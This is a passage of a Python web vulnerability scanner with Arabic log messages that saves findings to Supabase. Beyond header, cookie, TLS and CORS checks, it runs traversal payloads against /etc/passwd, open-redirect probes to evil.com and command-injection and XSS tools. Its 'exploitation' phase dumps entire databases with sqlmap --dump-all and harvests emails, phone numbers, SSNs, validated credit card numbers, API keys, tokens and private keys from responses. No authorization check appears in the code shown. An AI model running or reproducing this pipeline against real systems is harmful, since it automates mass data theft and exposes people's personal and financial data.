                            evidence={"output": "\n".join(lines[:100])})

    # --- Dalfox (XSS) ---
    if tool_exists("dalfox"):
        log("Running dalfox...")
        stdout, _, _ = run_command(
            f"dalfox url {_q(TARGET_URL)} --silence --no-color --format json 2>/dev/null",
            timeout=300,
        )
        if stdout:
            try:
                data = json.loads(stdout)
                items = data if isinstance(data, list) else data.get("results", [])
                for finding in items:
                    payload = (finding.get("payload") or "").strip()
                    param = (finding.get("param") or "").strip()
                    poc_url = (finding.get("poc_url") or finding.get("data") or "").strip()
                    finding_type = (finding.get("type") or "").strip()

                    if not payload or not param or not finding_type:
                        continue
                    if "<" not in payload and "javascript:" not in payload.lower():
                        continue

                    save_result("known_vulns", "dalfox", "high",
                                f"XSS vulnerability confirmed: {finding_type}",
                                f"Parameter: {param}",
                                evidence={
                                    "payload_used": payload,
                                    "injection_point": param,
                                    "proof_of_concept_url": poc_url,
                                    "method": finding.get("method", "GET"),
                                },
                                remediation="Sanitize user input and use proper output encoding (HTML entity encoding)",
                                require_evidence=True)
            except json.JSONDecodeError:
                pass

    # --- Retire.js ---
    if tool_exists("retire"):
        log("Running retire.js...")
        stdout, _, _ = run_command(
            f"retire --js --url {_q(TARGET_URL)} --outputformat json 2>/dev/null",
            timeout=120,
        )
        if stdout:
            try:
                data = json.loads(stdout)
                for finding in (data if isinstance(data, list) else []):
                    vulns = finding.get("vulnerabilities", [])
                    if vulns:
                        save_result("known_vulns", "retirejs", "medium",
                                    f"Vulnerable JS library: {finding.get('library', '')}",
                                    str(vulns[0].get("info", ""))[:500],
                                    evidence=finding)
            except json.JSONDecodeError:
                pass

    # --- WPScan ---
    if tool_exists("wpscan"):
        log("Running wpscan...")
        stdout, _, _ = run_command(
            f"wpscan --url {_q(TARGET_URL)} --no-update --format json 2>/dev/null | head -200",
            timeout=300,
        )
        if stdout and "wordpress" in stdout.lower():
            save_result("known_vulns", "wpscan", "info",
                        "WPScan results",
                        "WordPress vulnerability scan",
                        evidence={"output": stdout[:3000]})

    # --- Skipfish ---
    if tool_exists("skipfish"):
        log("Running skipfish...")
        skipfish_out = f"/tmp/skipfish_out_{SCAN_ID[:8]}"
        stdout, _, _ = run_command(
            f"timeout 90 skipfish -o {_q(skipfish_out)} {_q(TARGET_URL)} 2>/dev/null | head -30",
            timeout=120,
        )
        if stdout:
            save_result("known_vulns", "skipfish", "info",
                        "Skipfish scan",
                        "Web security scan results",
                        evidence={"output": stdout[:1500]})

    # --- Commix ---
    if tool_exists("commix"):
        log("Running commix...")
        stdout, _, _ = run_command(
            f"commix --url={_q(TARGET_URL)} --batch --level=1 --timeout=10 2>/dev/null | head -60",
            timeout=300,
        )
        if stdout and "vulnerable" in stdout.lower():
            save_result("known_vulns", "commix", "critical",
                        "Command Injection detected",
                        "Commix found command injection vulnerability",
                        evidence={"output": stdout[:3000]},
                        remediation="Sanitize all user input and avoid system calls")

    # --- XSStrike ---
    if os.path.exists("/opt/XSStrike/xsstrike.py"):
        log("Running xsstrike...")
        stdout, _, _ = run_command(
            f"timeout 120 python3 /opt/XSStrike/xsstrike.py -u {_q(TARGET_URL)} --skip 2>/dev/null | head -60",
            timeout=180,
        )
        if stdout and "vulnerable" in stdout.lower():
            save_result("known_vulns", "xsstrike", "high",
                        "XSS vulnerability detected (XSStrike)",
                        "XSStrike found XSS vulnerability",
                        evidence={"output": stdout[:3000]})

    # --- Gitleaks ---
    if tool_exists("gitleaks"):
        log("Running gitleaks on JS files...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            gl_out = f.name
        stdout_js, _, _ = run_command(
            f"katana -u {_q(TARGET_URL)} -silent -d 3 -jc 2>/dev/null | grep -iE '\\.js($|\\?)' | head -30",
            timeout=180,
        )
        if stdout_js:
            js_urls = [u.strip() for u in stdout_js.strip().split("\n") if u.strip()]
            tmpdir = tempfile.mkdtemp(prefix="js_scan_")
            for i, js_url in enumerate(js_urls[:20]):
                run_command(f"curl -s -L --max-time 10 {_q(js_url)} -o {_q(tmpdir)}/js_{i}.js 2>/dev/null", timeout=15)
            run_command(
                f"gitleaks detect --source {_q(tmpdir)} --report-format json --report-path {gl_out} --no-git 2>/dev/null",
                timeout=120,
            )
            try:
                if os.path.exists(gl_out) and os.path.getsize(gl_out) > 2:
                    with open(gl_out, 'r') as f:
                        leaks = json.load(f)
                    if isinstance(leaks, list) and leaks:
                        save_result("known_vulns", "gitleaks", "high",
                                    f"Hardcoded secrets detected in JS files ({len(leaks)})",
                                    "تم اكتشاف مفاتيح/أسرار مكتوبة داخل ملفات JavaScript",
                                    evidence={"leaks": leaks[:20]},
                                    remediation="انقل الأسرار إلى متغيرات بيئة ولا تضعها في JS")
            except Exception as e:
                log(f"gitleaks parse error: {e}", "warning")
            finally:
                if os.path.exists(gl_out):
                    os.remove(gl_out)
                run_command(f"rm -rf {_q(tmpdir)}", timeout=10)

    log("✅ مرحلة الفحص النشط انتهت")


# ============================================================
# PHASE 3: ZERO-DAY / ANOMALY
# ============================================================

def phase_zero_day():
    update_scan_phase("zero_day", 55)
    log("═══════════════ بدء مرحلة تحليل Zero-Day ═══════════════")
    domain = get_domain()
    port = get_port()

    # --- Katana sensitive endpoints ---
    if tool_exists("katana"):
        log("Analyzing sensitive endpoints...")
        stdout, _, _ = run_command(
            f"katana -u {_q(TARGET_URL)} -silent -d 3 2>/dev/null | head -500",
            timeout=300,
        )
        if stdout:
            urls = [u.strip() for u in stdout.strip().split("\n") if u.strip()]
            sensitive_patterns = [
                r'\.(env|git|sql|bak|config|log|yml|yaml|xml|json|swp|old)$',
                r'(admin|backup|config|api|graphql|swagger|debug|test)',
                r'(\.well-known|\.git/|\.svn/|\.htaccess|\.DS_Store)',
                r'(phpinfo|server-status|server-info)',
                r'(wp-admin|wp-config|xmlrpc)',
            ]
            found_sensitive = []
            for url in urls:
                for pattern in sensitive_patterns:
                    if re.search(pattern, url, re.IGNORECASE):
                        found_sensitive.append({"url": url, "pattern": pattern})
                        break
            if found_sensitive:
                save_result("zero_day", "katana", "medium",
                            f"Potentially sensitive endpoints ({len(found_sensitive)})",
                            "Endpoints matched sensitive patterns",
                            evidence={"endpoints": found_sensitive[:100]},
                            remediation="Review if this endpoint should be publicly accessible")

    # --- Security Headers ---
    log("Checking security headers...")
    headers = fetch_headers(TARGET_URL)
    if headers:
        missing = []
        for header in ["strict-transport-security", "content-security-policy",
                       "x-frame-options", "x-content-type-options", "referrer-policy",
                       "permissions-policy"]:
            if header not in headers.lower():
                missing.append(header)
        if missing:
            save_result("zero_day", "httpx", "medium",
                        f"Missing security headers ({len(missing)})",
                        f"Missing: {', '.join(missing)}",
                        evidence={"missing": missing, "raw_headers": headers[:2000]},
                        remediation="Add these headers to server configuration")

    # --- Cookie Security (using GET to capture Set-Cookie) ---
    log("Analyzing cookie security...")
    cookie_headers = fetch_headers(TARGET_URL, use_get=True)
    if cookie_headers:
        cookies_lines = [l for l in cookie_headers.split("\n") if l.lower().startswith("set-cookie:")]
        if cookies_lines:
            insecure_flags = []
            for cookie in cookies_lines:
                if "httponly" not in cookie.lower():
                    insecure_flags.append("Missing HttpOnly")
                if "secure" not in cookie.lower():
                    insecure_flags.append("Missing Secure")
                if "samesite" not in cookie.lower():
                    insecure_flags.append("Missing SameSite")
            if insecure_flags:
                save_result("zero_day", "custom", "medium",
                            "Insecure cookie flags",
                            f"Issues: {', '.join(set(insecure_flags))}",
                            evidence={"cookies": cookies_lines[:5], "issues": list(set(insecure_flags))},
                            remediation="Set HttpOnly, Secure, and SameSite flags on cookies")

    # --- CORS ---
    log("Checking CORS...")
    stdout, _, _ = run_command(
        f"curl -sI -H 'Origin: https://evil.com' --max-time 15 {_q(TARGET_URL)} 2>/dev/null | grep -i 'access-control'",
        timeout=20,
    )
    if stdout and "evil.com" in stdout:
        save_result("zero_day", "custom", "high",
                    "CORS misconfiguration",
                    "Server reflects arbitrary Origin header",
                    evidence={"cors_header": stdout.strip()},
                    remediation="Validate Origin header against whitelist",
                    require_evidence=True)

    # --- Open Redirect ---
    log("Checking open redirect...")
    for payload in ["//evil.com", "https://evil.com", "/\\evil.com"]:
        test_url = f"{TARGET_URL}?url={payload}"
        stdout, _, _ = run_command(
            f"curl -sI --max-time 15 {_q(test_url)} 2>/dev/null | grep -i 'location'",
            timeout=20,
        )
        if stdout and "evil.com" in stdout:
            save_result("zero_day", "custom", "high",
                        "Open redirect vulnerability",
                        "Parameter 'url' redirects to external domain",
                        evidence={"payload": payload, "response": stdout.strip()},
                        remediation="Validate redirect URLs against whitelist",
                        require_evidence=True)
            break

    # --- HTTP Methods ---
    log("Checking HTTP methods...")
    stdout, _, _ = run_command(
        f"curl -sX OPTIONS -i --max-time 15 {_q(TARGET_URL)} 2>/dev/null | grep -i 'allow'",
        timeout=20,
    )
    if stdout:
        dangerous = [m for m in ["PUT", "DELETE", "TRACE", "CONNECT"] if m in stdout.upper()]
        if dangerous:
            save_result("zero_day", "custom", "medium",
                        f"Dangerous HTTP methods allowed: {', '.join(dangerous)}",
                        f"Server allows: {stdout.strip()}",
                        evidence={"methods": stdout.strip()},
                        remediation="Disable unnecessary HTTP methods (PUT, DELETE, TRACE)")

    # --- Directory Traversal ---
    log("Checking directory traversal...")
    for payload in ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd"]:
        test_url = f"{TARGET_URL.rstrip('/')}/{payload}"
        stdout, _, _ = run_command(
            f"curl -s --max-time 15 {_q(test_url)} 2>/dev/null | head -10",
            timeout=20,
        )
        if stdout and "root:" in stdout:
            save_result("zero_day", "custom", "critical",
                        "Directory Traversal vulnerability",
                        "Server allows path traversal to /etc/passwd",
                        evidence={"payload": payload, "output": stdout[:1000]},
                        remediation="Validate file paths and restrict access to allowed directories",
                        require_evidence=True,
                        expected_markers=["root:"])
            break

    # --- Information Disclosure (with soft-404 filter) ---
    log("Checking information disclosure...")
    for f, patterns in SENSITIVE_FILE_SIGNATURES.items():
        file_url = f"{TARGET_URL.rstrip('/')}/{f}"
        status = fetch_status_code(file_url, timeout=15)
        if status != "200":
            continue

        content_type = fetch_content_type(file_url, timeout=10)
        if "text/html" in content_type.lower():
            body_check = fetch_body_snippet(file_url, max_bytes=3000)
            if "<!DOCTYPE html" in body_check[:500].lower() or "<html" in body_check[:500].lower():
                continue

        body = fetch_body_snippet(file_url, max_bytes=3000)
        is_confirmed = bool(body) and any(re.search(p, body, re.IGNORECASE) for p in patterns)

        if is_confirmed:
            save_result("zero_day", "custom", "high",
                        f"ملف حساس مكشوف ومؤكد: /{f}",
                        f"الملف /{f} متاح للعامة، وتم التحقق من محتواه الفعلي",
                        evidence={
                            "file": f,
                            "status": 200,
                            "url": file_url,
                            "content_type": content_type,
                            "content_proof_snippet": body[:1500],
                        },
                        remediation=f"احذف الملف فورًا أو امنع الوصول إليه من /{f}",
                        require_evidence=True)

    # --- TLS/SSL Weakness ---
    log("Checking TLS configuration...")
    weak_tls_found = []
    for proto_name, flag in [("TLS 1.0", "-tls1"), ("TLS 1.1", "-tls1_1")]:
        stdout, _, _ = run_command(
            f"echo | openssl s_client -connect {_q(domain)}:{port} {flag} 2>&1 | grep -E 'Cipher|Protocol|handshake failure'",
            timeout=20,
        )
        output = stdout or ""
        handshake_failed = ("handshake failure" in output.lower()
                            or "cipher is (none)" in output.lower()
                            or not output.strip())
        if not handshake_failed:
            weak_tls_found.append({"protocol": proto_name, "details": output.strip()[:500]})

    if weak_tls_found:
        save_result("zero_day", "custom", "high",
                    f"الموقع بيدعم بروتوكولات TLS قديمة ({len(weak_tls_found)})",
                    "دعم بروتوكولات TLS قديمة يعرّض الاتصال لهجمات Downgrade",
                    evidence={"weak_protocols": weak_tls_found},
                    remediation="عطّل TLS 1.0 و TLS 1.1 من إعدادات السيرفر")

    # --- Robots.txt ---
    log("Checking robots.txt...")
    stdout, _, _ = run_command(
        f"curl -s --max-time 15 {_q(TARGET_URL.rstrip('/') + '/robots.txt')} 2>/dev/null | head -50",
        timeout=20,
    )
    if stdout and ("disallow" in stdout.lower() or "allow" in stdout.lower()):
        save_result("zero_day", "custom", "info",
                    "robots.txt found",
                    "Discovered paths from robots.txt",
                    evidence={"content": stdout[:2000]},
                    remediation="Review if sensitive paths are listed in robots.txt")

    # --- Sitemap.xml ---
    log("Checking sitemap.xml...")
    stdout, _, _ = run_command(
        f"curl -s --max-time 15 {_q(TARGET_URL.rstrip('/') + '/sitemap.xml')} 2>/dev/null | head -50",
        timeout=20,
    )
    if stdout and ("<urlset" in stdout.lower() or "<sitemapindex" in stdout.lower()):
        save_result("zero_day", "custom", "info",
                    "Sitemap found",
                    "URLs discovered from sitemap.xml",
                    evidence={"content": stdout[:2000]})

    # --- Certificate Expiry ---
    log("Checking certificate expiry...")
    stdout, _, _ = run_command(
        f"echo | openssl s_client -connect {_q(domain)}:{port} -servername {_q(domain)} 2>/dev/null | "
        f"openssl x509 -noout -dates -subject -issuer 2>/dev/null",
        timeout=30,
    )
    if stdout:
        save_result("zero_day", "custom", "info",
                    "SSL Certificate details",
                    "Certificate information",
                    evidence={"output": stdout[:1000]})

    # --- Rate Limiting ---
    log("Checking rate limiting...")
    stdout, _, _ = run_command(
        f"for i in $(seq 1 20); do curl -s -o /dev/null -w '%{{http_code}}\\n' --max-time 5 {_q(TARGET_URL)} 2>/dev/null; done | sort | uniq -c",
        timeout=120,
    )
    if stdout:
        codes = stdout.strip()
        if "429" not in codes and "503" not in codes:
            save_result("zero_day", "custom", "medium",
                        "لا يوجد Rate Limiting واضح",
                        f"توزيع أكواد الاستجابة على 20 طلب متتالي: {codes}",
                        evidence={"codes": codes},
                        remediation="فعّل Rate Limiting لمنع هجمات القوة الغاشمة",
                        require_evidence=True)

    log("✅ مرحلة Zero-Day انتهت")


# ============================================================
# PHASE 4: ADVANCED EXPLOITATION & DATA EXTRACTION
# ============================================================

def extract_pii_from_content(content, source_url):
    if not content or len(content) < 50:
        return None

    emails = list(set(PII_EMAIL_REGEX.findall(content)))
    phones = list(set(m for m in PII_PHONE_REGEX.findall(content) if len(re.sub(r"\D", "", m)) >= 10))
    ssns = list(set(PII_SSN_REGEX.findall(content)))
    ccs = list(set(PII_CREDIT_CARD_REGEX.findall(content)))
    api_keys = list(set(m for m in PII_API_KEY_REGEX.findall(content) if len(m) >= 16))
    jwts = list(set(PII_JWT_REGEX.findall(content)))
    bcrypts = list(set(PII_BCRYPT_REGEX.findall(content)))
    aws_keys = list(set(PII_AWS_KEY_REGEX.findall(content)))
    github_tokens = list(set(PII_GITHUB_TOKEN_REGEX.findall(content)))
    private_keys = PII_PRIVATE_KEY_REGEX.findall(content)

    result = {}
    if emails:
        result["emails"] = emails[:50]
    if phones:
        result["phones"] = phones[:50]
    if ssns:
        result["ssn"] = ssns[:20]
    if ccs:
        valid_ccs = []
        for cc in ccs[:20]:
            digits = re.sub(r"\D", "", cc)
            if 13 <= len(digits) <= 19:
                total = 0
                reverse = digits[::-1]
                for i, d in enumerate(reverse):
                    n = int(d)
                    if i % 2 == 1:
                        n *= 2
                        if n > 9:
                            n -= 9
                    total += n
                if total % 10 == 0:
                    valid_ccs.append(cc)
        if valid_ccs:
            result["credit_cards"] = valid_ccs[:20]
    if api_keys:
        result["api_keys"] = api_keys[:20]
    if jwts:
        result["jwt_tokens"] = jwts[:20]
    if bcrypts:
        result["bcrypt_hashes"] = bcrypts[:20]
    if aws_keys:
        result["aws_access_keys"] = aws_keys[:10]
    if github_tokens:
        result["github_tokens"] = github_tokens[:10]
    if private_keys:
        result["private_keys_found"] = len(private_keys)

    if result:
        result["source_url"] = source_url
        return result
    return None


def discover_databases():
    if not tool_exists("sqlmap"):
        return []
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        dbs_out = f.name
    run_command(
        f"sqlmap -u {_q(TARGET_URL)} --batch --dbs --threads=2 --timeout=15 --retries=1 2>/dev/null | tee {dbs_out}",
        timeout=600,
    )
    dbs = []
    try:
        with open(dbs_out, 'r') as f:
            content = f.read()
        for line in content.split("\n"):
            m = re.search(r"\[\*\]\s+([a-zA-Z0-9_\-]+)\s*$", line.strip())
            if m:
                db = m.group(1)
                if db not in dbs and db not in ("information_schema", "mysql", "performance_schema", "sys"):
                    dbs.append(db)
    except Exception:
        pass
    finally:
        if os.path.exists(dbs_out):
            os.remove(dbs_out)
    return dbs[:2]


def phase_advanced_exploitation():
    update_scan_phase("exploitation", 70)
    log("═══════════════ بدء مرحلة الاستغلال وسحب البيانات ═══════════════")

    # --- Full DB dump (time-limited) ---
    if tool_exists("sqlmap"):
        log("Running sqlmap --dump-all (full database extraction, time-limited)...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            db_dump_out = f.name
        sqlmap_dump_dir = f"/tmp/sqlmap_dump_{SCAN_ID[:8]}"
        run_command(
            f"sqlmap -u {_q(TARGET_URL)} --batch --level=2 --risk=2 "
            f"--dump-all --exclude-sysdbs --threads=4 --timeout=10 --retries=1 "
            f"--output-dir={_q(sqlmap_dump_dir)} 2>/dev/null | tee {db_dump_out}",
            timeout=1500,
        )
        try:
            with open(db_dump_out, 'r') as f:
                db_content = f.read()
            dumped_files_data = {}
            if os.path.exists(sqlmap_dump_dir):
                for root, dirs, files in os.walk(sqlmap_dump_dir):
                    for fn in files:
                        if fn.endswith(".csv"):
                            fp = os.path.join(root, fn)
                            try:
                                with open(fp, 'r', errors="ignore") as cf:
                                    content = cf.read()
                                if content.strip():
                                    rel = os.path.relpath(fp, sqlmap_dump_dir)
                                    dumped_files_data[rel] = content[:5000]
                            except Exception:
                                pass

            if dumped_files_data or ("Database:" in db_content and "Table:" in db_content):
                all_pii = {}
                for fn, content in dumped_files_data.items():
                    pii = extract_pii_from_content(content, f"sqlmap_dump:{fn}")
                    if pii:
                        for k, v in pii.items():
                            if k == "source_url":
                                continue
                            all_pii.setdefault(k, []).extend(v if isinstance(v, list) else [v])

                evidence = {
                    "output_snippet": db_content[:3000],
                    "dumped_files_count": len(dumped_files_data),
                    "dumped_files_preview": dict(list(dumped_files_data.items())[:5]),
                    "extracted_pii": all_pii if all_pii else {},
                }
                save_result("exploitation", "sqlmap_dump", "critical",
                            "تم سحب قواعد البيانات بالكامل عبر SQLMap --dump-all",
                            "تم تنفيذ استعلام هيكلي كامل على قاعدة البيانات وسحب الجداول والبيانات",
                            evidence=evidence,
                            remediation="استخدام استعلامات مُعدّة مسبقاً (Prepared Statements) وتقييد صلاحيات حساب قاعدة البيانات",
                            require_evidence=True)
        except Exception as e:
            log(f"Database dump parsing error: {e}", "warning")
        finally:
            if os.path.exists(db_dump_out):
                os.remove(db_dump_out)

    # --- Targeted sensitive table dumps (with -D) ---
    if tool_exists("sqlmap"):
        log("Discovering database names for targeted table dumps...")
        db_names = discover_databases()
        if db_names:
            log(f"Found {len(db_names)} database(s): {', '.join(db_names)}")
            for db_name in db_names[:2]:
                for table in SENSITIVE_DB_TABLES[:3]:
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                        tbl_out = f.name
                    run_command(
                        f"sqlmap -u {_q(TARGET_URL)} --batch --level=2 --risk=1 "
                        f"-D {_q(db_name)} -T {_q(table)} --dump --threads=2 --timeout=10 --retries=1 2>/dev/null | tee {tbl_out}",
                        timeout=300,
                    )
                    try:
                        with open(tbl_out, 'r') as f:
                            content = f.read()
                        if ("Table: " + table) in content or "fetched data" in content.lower():
                            pii = extract_pii_from_content(content, f"{db_name}.{table}")
                            if pii or len(content) > 500:
                                save_result("exploitation", "sqlmap_table", "critical",
                                            f"تم سحب جدول حساس: {db_name}.{table}",
                                            f"تم سحب بيانات جدول {table} من قاعدة البيانات {db_name}",
                                            evidence={"database": db_name, "table": table,
                                                      "content_snippet": content[:3000],
                                                      "extracted_pii": pii or {}},
                                            remediation="شفر البيانات الحساسة في قاعدة البيانات وقيّد الوصول لها",
                                            require_evidence=True)
                    except Exception as e:
                        log(f"Table dump error ({db_name}.{table}): {e}", "warning")
                    finally:
                        if os.path.exists(tbl_out):
                            os.remove(tbl_out)

    # --- PII from structured API endpoints ---
    log("Extracting PII from structured API endpoints...")
    if tool_exists("katana"):
        stdout, _, _ = run_command(
            f"katana -u {_q(TARGET_URL)} -silent -d 3 -jc 2>/dev/null | "
            f"grep -iE '\\.(json|xml|php|aspx|jsp)($|\\?)|/api/|/graphql' | head -50",
            timeout=180,
        )
        if stdout:
            endpoints = [e.strip() for e in stdout.split("\n") if e.strip()]
            pii_matches = []
            for ep in endpoints[:25]:
                headers = fetch_headers(ep, timeout=10)
                if not headers:
                    continue
                is_structured = any(ct in headers.lower() for ct in
                                    ["application/json", "application/xml", "text/xml",
                                     "application/graphql", "text/csv"])
                if not is_structured and not ep.lower().endswith(('.json', '.xml')):
                    continue

                body = fetch_body_snippet(ep, max_bytes=5000, timeout=10)
                pii = extract_pii_from_content(body, ep)
                if pii:
                    pii_matches.append(pii)

            if pii_matches:
                aggregated = {}
                for match in pii_matches:
                    for k, v in match.items():
                        if k == "source_url":
                            continue
                        if isinstance(v, list):
                            aggregated.setdefault(k, []).extend(v)
                save_result("exploitation", "pii_extractor", "critical",
                            f"تم رصد وسحب بيانات PII حقيقية من {len(pii_matches)} endpoint",
                            "تم رصد واستخراج معلومات شخصية حساسة تشمل بريد إلكتروني وأرقام هواتف ومفاتيح API من مسارات API منظمة",
                            evidence={"pii_data": pii_matches[:10], "aggregated": aggregated},
                            remediation="تشفير أو اخفاء بيانات المستخدمين الحساسة ومنع ظهورها في الاستجابات العامة",
                            require_evidence=True)

    # --- Sensitive files ---
    log("Extracting full sensitive files...")
    extracted_files = []
    for file_name, patterns in SENSITIVE_FILE_SIGNATURES.items():
        file_url = f"{TARGET_URL.rstrip('/')}/{file_name}"
        status = fetch_status_code(file_url, timeout=10)
        if status != "200":
            continue
        body = fetch_body_snippet(file_url, max_bytes=5000, timeout=10)
        if body and any(re.search(p, body, re.IGNORECASE) for p in patterns):
            pii = extract_pii_from_content(body, file_url)
            extracted_files.append({
                "file": file_name,
                "url": file_url,
                "content": body[:3000],
                "extracted_pii": pii or {},
            })

    if extracted_files:
        save_result("exploitation", "file_extractor", "critical",
                    f"تم سحب {len(extracted_files)} ملفات حساسة من الخادم",
                    "تم تحميل محتوى ملفات إعدادات النظام الحساسة بالكامل كدليل على صحة الثغرة",
                    evidence={"extracted_files": extracted_files[:10]},
                    remediation="حماية مجلدات الجذر ومنع الوصول المباشر لملفات الإعدادات والنسخ الاحتياطي",
                    require_evidence=True)

    # --- Secrets in JS files ---
    log("Extracting secrets from JavaScript files...")
    if tool_exists("katana"):
        stdout_js, _, _ = run_command(
            f"katana -u {_q(TARGET_URL)} -silent -d 2 -jc 2>/dev/null | grep -iE '\\.js' | head -20",
            timeout=120,
        )
        if stdout_js:
            js_urls = [u.strip() for u in stdout_js.strip().split("\n") if u.strip()]
            all_secrets = []
            for js_url in js_urls[:15]:
                body = fetch_body_snippet(js_url, max_bytes=10000, timeout=10)
                pii = extract_pii_from_content(body, js_url)
                if pii:
                    all_secrets.append(pii)

            if all_secrets:
                agg = {}
                for s in all_secrets:
                    for k, v in s.items():
                        if k == "source_url":
                            continue
                        if isinstance(v, list):
                            agg.setdefault(k, []).extend(v)
                save_result("exploitation", "js_secrets", "high",
                            f"تم اكتشاف أسرار داخل ملفات JS ({len(all_secrets)} ملف)",
                            "تم استخراج مفاتيح API، توكنات، أو كلمات مرور مكتوبة داخل ملفات JavaScript",
                            evidence={"secrets": all_secrets[:10], "aggregated": agg},
                            remediation="نقل الأسرار إلى متغيرات بيئة على السيرفر ولا تضعها في JS",
                            require_evidence=True)

    # --- GraphQL Introspection ---
    log("Checking GraphQL introspection...")
    graphql_endpoints = [
        f"{TARGET_URL.rstrip('/')}/graphql",
        f"{TARGET_URL.rstrip('/')}/api/graphql",
        f"{TARGET_URL.rstrip('/')}/v1/graphql",
        f"{TARGET_URL.rstrip('/')}/graphiql",
    ]
    for gql_url in graphql_endpoints:
        status = fetch_status_code(gql_url, timeout=10)
        if status != "200":
            continue
        payload = '{"query":"{__schema{types{name}}}"}'
        stdout, _, _ = run_command(
            f"curl -s --max-time 15 -X POST -H 'Content-Type: application/json' "
            f"-d {_q(payload)} {_q(gql_url)} 2>/dev/null | head -c 3000",
            timeout=20,
        )
        if stdout and "__schema" in stdout and "types" in stdout:
            save_result("exploitation", "graphql", "high",
                        "GraphQL Introspection enabled",
                        "GraphQL endpoint allows schema introspection - يمكن استخراج كل schema قاعدة البيانات",
                        evidence={"endpoint": gql_url, "response_snippet": stdout[:2000]},
                        remediation="عطّل introspection في بيئة الإنتاج",
                        require_evidence=True,
                        expected_markers=["__schema", "types"])
            break

    log("✅ مرحلة الاستغلال انتهت")


# ============================================================
# MAIN
# ============================================================

def main():
    log(f"🚀 بدء الفحص لـ {TARGET_URL} | Scan ID: {SCAN_ID}")

    try:
        supabase.table("scans").update({
            "status": "running",
            "started_at": datetime.utcnow().isoformat(),
            "current_phase": "starting",
            "progress_percent": 0,
        }).eq("id", SCAN_ID).execute()

        alive, alive_info = check_target_alive()
        if not alive:
            error_msg = f"❌ تم إيقاف الفحص: {alive_info['reason']}"
            log(error_msg, "critical")
            supabase.table("scans").update({
                "status": "failed",
                "error_message": error_msg,
                "completed_at": datetime.utcnow().isoformat(),
            }).eq("id", SCAN_ID).execute()
            return

        log(f"✅ الموقع شغال (HTTP {alive_info['status_code']}) - بدء الفحص", "success")

        update_scan_phase("starting", 2)
        gather_target_evidence()

        try:
            phase_recon()
        except Exception as e:
            log(f"⚠️ خطأ في مرحلة الاستطلاع (يُكمل): {e}", "error")

        try:
            phase_known_vulns()
        except Exception as e:
            log(f"⚠️ خطأ في مرحلة الفحص النشط (يُكمل): {e}", "error")

        try:
            phase_zero_day()
        except Exception as e:
            log(f"⚠️ خطأ في مرحلة Zero-Day (يُكمل): {e}", "error")

        try:
            phase_advanced_exploitation()
        except Exception as e:
            log(f"⚠️ خطأ في مرحلة الاستغلال (يُكمل): {e}", "error")

        update_scan_phase("reporting", 90)
        results = supabase.table("results").select("severity").eq("scan_id", SCAN_ID).execute()
        results_data = results.data or []

        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        for r in results_data:
            sev = r.get("severity")
            if sev in counts:
                counts[sev] += 1

        elapsed = int(time.time() - SCAN_START_TIME)

        supabase.table("scans").update({
            "status": "completed",
            "completed_at": datetime.utcnow().isoformat(),
            "current_phase": "completed",
            "progress_percent": 100,
            "elapsed_seconds": elapsed,
            "total_findings": len(results_data),
            "critical_count": counts["critical"],
            "high_count": counts["high"],
            "medium_count": counts["medium"],
            "low_count": counts["low"],
        }).eq("id", SCAN_ID).execute()

        log(f"✅ الفحص اكتمل. إجمالي النتائج: {len(results_data)} "
            f"(Critical: {counts['critical']}, High: {counts['high']}, "
            f"Medium: {counts['medium']}, Low: {counts['low']}) | المدة: {elapsed}s",
            "success")

        try:
            from reporter import main as generate_reports
            generate_reports()
            log("✅ تم توليد التقارير بنجاح", "success")
        except Exception as e:
            log(f"⚠️ فشل توليد التقارير: {str(e)}", "warning")

    except Exception as e:
        log(f"❌ فشل الفحص: {str(e)}", "error")
        try:
            supabase.table("scans").update({
                "status": "failed",
                "error_message": str(e)[:2000],
                "completed_at": datetime.utcnow().isoformat(),
            }).eq("id", SCAN_ID).execute()
        except Exception:
            pass
        raise


if __name__ == "__main__":
    main()